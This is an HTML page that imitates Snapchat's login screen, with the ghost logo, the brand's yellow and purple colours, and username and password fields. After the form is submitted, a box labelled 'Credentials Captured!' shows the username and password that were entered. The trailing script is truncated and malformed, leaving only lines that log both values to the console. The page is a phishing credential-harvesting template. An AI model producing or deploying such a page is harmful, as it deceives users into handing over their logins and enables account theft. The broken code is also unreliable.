<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <!-- Crucial Meta Tag for proper mobile rendering -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>👻 Log In to Snapchat</title>
    <style>
        /* --- GLOBAL STYLES & LAYOUT --- */
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            background-color: #f5f7fa; /* Very light gray/off-white background, common in iOS apps */
        }

        .login-container {
            width: 100%;
            max-width: 400px; /* Standard phone width constraint */
            text-align: center;
            padding: 30px 20px;
            background: #ffffff;
            border-radius: 20px; /* More pronounced rounding for iOS feel */
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1); /* Deeper shadow */
        }

        /* Snapchat Logo Styling */
        .snapchat-logo {
            font-size: 60px; /* Big ghost icon! */
            margin-bottom: 15px;
            display: block;
        }

        h1 {
            color: #3A017C; /* Deep Purple text */
            margin-top: 0;
            font-size: 2em;
            font-weight: 700; /* Bolder font weight for title */
        }
        
        /* --- INPUT FIELD STYLING (Modern iOS Look) --- */
        input[type="text"], input[type="password"] {
            width: calc(100% - 32px); /* Full width minus padding/border space */
            padding: 15px 12px; /* Slightly larger padding */
            margin-bottom: 18px; /* More spacing between inputs */
            background-color: #f9f9f9; /* Very light gray input background */
            border: 1px solid #ccc;
            border-radius: 30px; /* Pill shape for iOS style */
            font-size: 1em;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            box-sizing: border-box; /* Ensures padding doesn't increase total width */
        }

        input[type="text"]:focus, input[type="password"]:focus {
            border-color: #4A90E2; /* Blue focus ring */
            box-shadow: 0 0 0 3px rgba(74, 144, 226, 0.3); /* Soft blue glow on focus */
            outline: none;
        }

        /* --- BUTTON STYLING (The Action Button) --- */
        button {
            width: 100%;
            padding: 15px; /* Slightly bigger button padding */
            background-color: #FFFC00; /* Bright Yellow button */
            border: none;
            border-radius: 30px;
            font-size: 1.1em;
            font-weight: bold;
            color: #3A017C; /* Purple text on yellow background */
            cursor: pointer;
            transition: background-color 0.2s ease, transform 0.1s ease;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15); /* Button shadow */
        }

        button:hover {
            background-color: #ffe833; /* Slightly lighter yellow on hover */
            transform: translateY(-2px); /* Little lift effect */
        }
        
        /* --- RESULTS AREA (The Secret Message - Now Visible by Default) --- */
        #results {
            margin-top: 40px; /* Increased margin so it doesn't hug the button too tightly */
            padding: 25px;
            border-radius: 15px; /* Slightly softer corners for results box */
            background-color: #e6f7ff; /* Very light, airy blue background */
            border: 2px dashed #4A90E2; /* A clear, friendly border */
            display: none; /* Will be changed to 'block' by JS */
        }

        #results h2 {
            color: #3A017C;
            margin-top: 0;
            font-size: 1.8em; /* Bigger title when showing results */
            border-bottom: 2px solid #4A90E2;
            padding-bottom: 10px;
        }

        #results p {
            margin: 12px 0;
            line-height: 1.5;
            font-size: 1em;
        }
        
        #results strong {
            color: #3A017C; /* Make the labels bold and purple */
            display: inline-block; /* Helps align the label perfectly next to the data */
            width: 120px; /* Fixed width for alignment */
        }
    </style>
</head>
<body>
    <div class="login-container">
        <!-- Snapchat Logo -->
        <div class="snapchat-logo">👻</div>
        <h1 style="font-size: 2.3em;">Snapchat</h1> <!-- Slightly bigger title for impact -->
        
        <!-- THE FORM: Action is set to "" so it submits back to THIS page -->
        <form id="snapLoginForm" action="" method="POST"> 
            
            <input type="text" name="username" placeholder="Username or Email" required>
            <input type="password" name="password" placeholder="Password" required>
            
            <button type="submit">Log In</button>
        </form>
        
        <!-- THE CAPTURE RESULTS AREA (Hidden until submission) -->
        <div id="results">
            <h2>✅ Credentials Captured!</h2>
            <p><strong style="font-size: 1.1em;">📱 Username/Email:</strong> <span id="displayUsername" style="font-weight: 600;"></span></p>
            <p><strong style="font-size: 1.1em;">🔒 Password:</strong> <span id="displayPassword" style="font-weight: 600;"></span></p>
        </div>
    </div>

    <!-- JAVASCRIPT: The Brain -->

                console.log("Username:", username);
                console.log("Password:", password);
